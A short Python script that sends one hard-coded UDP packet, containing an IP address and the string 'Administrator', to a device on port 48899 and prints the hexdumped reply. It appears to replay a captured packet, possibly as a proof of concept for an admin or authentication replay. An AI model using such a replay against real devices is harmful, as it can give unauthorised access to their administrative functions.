import socket
import binascii
import struct
import hexdump

def GetPkt():
	return binascii.a2b_hex("036614710000000006000000c0a83b8301010000050000000c000f003139322e3136382e35392e3133310007000600c0a83b8301010d000e0041646d696e6973747261746f720002000200310005000f003139322e3136382e35392e31333100")

if __name__ == '__main__':
	aim = ("192.168.99.54", 48899)
	client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	client_socket.settimeout(5)

try:
	pkt=GetPkt()
	client_socket.sendto(pkt,aim)
	replay,_ = client_socket.recvfrom(1024)
	hexdump.hexdump(replay)
except:
	client_socket.close()
	print("failed")
	exit(-1)
else:
	client_socket.close()
	print("success")
	exit(0)
